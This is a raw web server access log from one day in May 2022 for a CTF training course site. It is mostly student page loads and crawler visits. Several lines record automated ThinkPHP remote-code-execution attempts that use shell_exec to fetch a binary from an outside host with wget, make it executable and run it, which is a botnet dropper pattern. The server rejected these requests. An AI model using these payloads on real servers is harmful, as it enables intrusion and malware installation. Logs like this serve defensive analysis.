12.240.32.81 - - [15/May/2022:00:00:19 +0300] "GET /f2035be396/c7e9d9807d/5401 HTTP/1.1" 301 162 "-" "-"
69.218.167.224 - - [15/May/2022:09:14:42 +0300] "GET /stegano/spectrogram/ HTTP/2.0" 200 1025 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
201.53.197.228 - - [15/May/2022:09:14:42 +0300] "GET /stegano/pic/audacity_settings.png HTTP/2.0" 200 76391 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
111.46.208.40 - - [15/May/2022:09:14:42 +0300] "GET /stegano/pic/lena_spectrogram.png HTTP/2.0" 200 296101 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
80.74.236.97 - - [15/May/2022:09:14:42 +0300] "GET /stegano/pic/riding_the_wave.png HTTP/2.0" 200 383735 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
215.102.49.125 - - [15/May/2022:09:14:42 +0300] "GET /stegano/files/never_gonna_give_you_up.mp3 HTTP/2.0" 206 253566 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
97.178.83.112 - - [15/May/2022:09:14:43 +0300] "GET /stegano/spectrogram/spectrogram.js HTTP/2.0" 200 5495 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
254.53.222.35 - - [15/May/2022:09:14:43 +0300] "GET /stegano/spectrogram/lena.png HTTP/2.0" 200 88235 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
116.40.34.119 - - [15/May/2022:09:15:27 +0300] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
100.158.242.67 - - [15/May/2022:09:15:31 +0300] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
210.53.106.200 - - [15/May/2022:09:16:05 +0300] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
121.14.140.168 - - [15/May/2022:09:16:08 +0300] "GET /favicon.ico HTTP/1.1" 404 548 "http://ttc.tf/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
12.216.226.148 - - [15/May/2022:09:16:11 +0300] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
2.154.158.172 - - [15/May/2022:09:16:13 +0300] "GET / HTTP/1.1" 200 612 "http://ttc.tf" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
170.209.127.168 - - [15/May/2022:09:16:21 +0300] "GET / HTTP/1.0" 200 415 "-" "-"
44.57.204.178 - - [15/May/2022:09:18:35 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://77.68.125.237/sicko_mode/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Uirusu/2.0"
233.228.83.222 - - [15/May/2022:09:20:24 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.239.147.201/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Uirusu/2.0"
205.186.45.228 - - [15/May/2022:09:22:49 +0300] "GET / HTTP/1.0" 200 415 "-" "masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)"
168.68.158.145 - - [15/May/2022:09:25:48 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.124.84.135/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
13.176.107.135 - - [15/May/2022:09:26:13 +0300] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
61.45.44.152 - - [15/May/2022:09:26:54 +0300] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
107.210.38.95 - - [15/May/2022:09:28:48 +0300] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
58.10.54.131 - - [15/May/2022:09:29:00 +0300] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
74.245.33.204 - - [15/May/2022:09:29:38 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
191.145.90.235 - - [15/May/2022:09:35:40 +0300] "GET /stegano/audio.html HTTP/2.0" 200 14759 "https://course.ugractf.ru/stegano/pictures.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
161.225.146.19 - - [15/May/2022:09:35:40 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
89.233.126.13 - - [15/May/2022:09:35:40 +0300] "GET /static/book.js HTTP/2.0" 200 1116 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
9.6.151.11 - - [15/May/2022:09:35:40 +0300] "GET /static/highlight/styles/github.css HTTP/2.0" 200 1148 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
152.219.186.133 - - [15/May/2022:09:35:40 +0300] "GET /static/graphic/logo_l.svg HTTP/2.0" 200 2841 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
186.137.171.188 - - [15/May/2022:09:35:40 +0300] "GET /stegano/spectrogram/ HTTP/2.0" 200 1025 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
59.233.16.243 - - [15/May/2022:09:35:40 +0300] "GET /static/highlight/highlight.pack.js HTTP/2.0" 200 108750 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
195.131.225.212 - - [15/May/2022:09:35:40 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
49.113.164.128 - - [15/May/2022:09:35:40 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
53.54.168.159 - - [15/May/2022:09:35:40 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
18.53.70.65 - - [15/May/2022:09:35:40 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
102.9.205.87 - - [15/May/2022:09:35:40 +0300] "GET /stegano/pic/aphex_twin.svg HTTP/2.0" 200 16737 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
185.170.219.0 - - [15/May/2022:09:35:40 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
250.133.213.113 - - [15/May/2022:09:35:40 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
99.203.147.41 - - [15/May/2022:09:35:40 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
159.84.48.100 - - [15/May/2022:09:35:40 +0300] "GET /stegano/spectrogram/spectrogram.js HTTP/2.0" 200 5495 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
103.229.84.32 - - [15/May/2022:09:35:41 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
111.98.29.195 - - [15/May/2022:09:35:41 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
182.157.246.205 - - [15/May/2022:09:35:41 +0300] "GET /stegano/pic/audacity_settings.png HTTP/2.0" 200 76391 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
85.115.197.28 - - [15/May/2022:09:35:41 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
187.41.135.121 - - [15/May/2022:09:35:41 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
173.143.183.130 - - [15/May/2022:09:35:41 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
46.217.249.142 - - [15/May/2022:09:35:41 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/static/book.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
174.88.37.107 - - [15/May/2022:09:35:41 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
89.53.189.124 - - [15/May/2022:09:35:41 +0300] "GET /static/vollkorn/Vollkorn-Italic.woff2 HTTP/2.0" 200 135048 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
187.169.74.185 - - [15/May/2022:09:35:42 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 200 152936 "https://course.ugractf.ru/static/vollkorn/vollkorn.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
203.38.95.129 - - [15/May/2022:09:35:42 +0300] "GET /static/graphic/loupe.svg HTTP/2.0" 200 2981 "https://course.ugractf.ru/static/book-nav.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
125.113.240.208 - - [15/May/2022:09:35:42 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/static/inter/inter.css" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
120.228.189.152 - - [15/May/2022:09:35:42 +0300] "GET /stegano/pic/lena_spectrogram.png HTTP/2.0" 200 296101 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
174.88.37.107 - - [15/May/2022:09:35:42 +0300] "GET /stegano/spectrogram/lena.png HTTP/2.0" 200 88235 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
255.37.182.220 - - [15/May/2022:09:35:43 +0300] "GET /stegano/files/never_gonna_give_you_up.mp3 HTTP/2.0" 206 253566 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
19.143.180.214 - - [15/May/2022:09:35:43 +0300] "GET /stegano/pic/riding_the_wave.png HTTP/2.0" 200 383735 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Linux; Android 11; Redmi Note 7 Build/RD2A.211001.002;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
96.178.242.32 - - [15/May/2022:09:37:08 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
207.245.235.187 - - [15/May/2022:09:42:14 +0300] "GET /static/favicon.png HTTP/2.0" 200 551 "https://course.ugractf.ru/intro/infosec.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.4.734 Yowser/2.5 Safari/537.36"
160.10.26.176 - - [15/May/2022:09:47:08 +0300] "GET /robots.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
255.255.251.176 - - [15/May/2022:09:47:12 +0300] "GET /stegano/ HTTP/1.1" 200 3078 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
0.159.53.187 - - [15/May/2022:09:49:09 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
97.178.83.112 - - [15/May/2022:09:49:41 +0300] "GET /stegano/ HTTP/1.1" 200 3078 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
16.55.64.226 - - [15/May/2022:09:57:33 +0300] "GET / HTTP/2.0" 303 218 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
63.133.99.69 - - [15/May/2022:09:59:32 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
158.8.192.111 - - [15/May/2022:10:00:10 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=day&date=2022-05-15&format=json&trigger=archivephp& HTTP/2.0" 200 37 "-" "Matomo/4.7.1"
11.4.148.232 - - [15/May/2022:10:00:10 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=week&date=2022-05-09&format=json&trigger=archivephp& HTTP/2.0" 200 36 "-" "Matomo/4.7.1"
7.87.126.190 - - [15/May/2022:10:00:11 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=month&date=2022-05-01&format=json&trigger=archivephp& HTTP/2.0" 200 37 "-" "Matomo/4.7.1"
119.248.220.87 - - [15/May/2022:10:00:11 +0300] "POST /?module=API&method=CoreAdminHome.archiveReports&idSite=1&period=year&date=2022-01-01&format=json&trigger=archivephp& HTTP/2.0" 200 38 "-" "Matomo/4.7.1"
180.52.135.239 - - [15/May/2022:10:01:16 +0300] "GET /xmlrpc.php HTTP/1.1" 404 146 "-" ""
66.243.68.140 - - [15/May/2022:10:02:06 +0300] "GET / HTTP/2.0" 200 3946 "https://ctfnews.ru/literature/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
67.203.16.77 - - [15/May/2022:10:02:06 +0300] "GET /static/book.css HTTP/2.0" 200 4872 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
167.212.48.117 - - [15/May/2022:10:02:06 +0300] "GET /static/graphic/logo_l.svg HTTP/2.0" 200 2841 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
63.17.134.181 - - [15/May/2022:10:02:06 +0300] "GET /static/graphic/cover.svg HTTP/2.0" 200 89221 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
139.104.172.100 - - [15/May/2022:10:02:06 +0300] "GET /static/rating.js HTTP/2.0" 200 7270 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
17.148.195.245 - - [15/May/2022:10:02:06 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3973 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
238.172.5.86 - - [15/May/2022:10:02:06 +0300] "GET /static/book-misc.css HTTP/2.0" 200 3119 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
169.146.12.162 - - [15/May/2022:10:02:06 +0300] "GET /static/book-text.css HTTP/2.0" 200 5407 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
15.227.66.63 - - [15/May/2022:10:02:06 +0300] "GET /static/inter/inter.css HTTP/2.0" 200 398 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
223.16.156.48 - - [15/May/2022:10:02:06 +0300] "GET /static/vollkorn/vollkorn.css HTTP/2.0" 200 388 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
158.42.48.144 - - [15/May/2022:10:02:06 +0300] "GET /static/jb/jb.css HTTP/2.0" 200 146 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
169.146.12.162 - - [15/May/2022:10:02:07 +0300] "GET /static/graphic/loupe.svg HTTP/2.0" 200 2981 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
12.221.22.172 - - [15/May/2022:10:02:07 +0300] "GET /static/vollkorn/Vollkorn-Regular.woff2 HTTP/2.0" 200 152936 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
255.255.251.176 - - [15/May/2022:10:02:07 +0300] "GET /static/inter/Inter-roman.var.woff2?v=3.12 HTTP/2.0" 200 226368 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
205.189.196.144 - - [15/May/2022:10:02:07 +0300] "GET /static/vollkorn/Vollkorn-Italic.woff2 HTTP/2.0" 200 135048 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
94.243.45.109 - - [15/May/2022:10:02:07 +0300] "GET /scores?0.06655124739837648 HTTP/2.0" 200 118704 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
83.170.195.63 - - [15/May/2022:10:02:07 +0300] "GET /static/favicon.png HTTP/2.0" 200 551 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
36.39.164.32 - - [15/May/2022:10:02:16 +0300] "GET /scores?0.3754840277789804 HTTP/2.0" 200 118704 "https://course.ugractf.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
238.172.5.86 - - [15/May/2022:10:02:40 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://51.81.133.91/FKKK/NW_BBB.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
244.102.69.88 - - [15/May/2022:10:04:13 +0300] "GET /intro HTTP/2.0" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
67.208.108.54 - - [15/May/2022:10:04:13 +0300] "GET /intro/ HTTP/2.0" 200 2298 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
12.216.226.148 - - [15/May/2022:10:04:13 +0300] "GET /static/highlight/styles/github.css HTTP/2.0" 200 1148 "https://course.ugractf.ru/intro/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
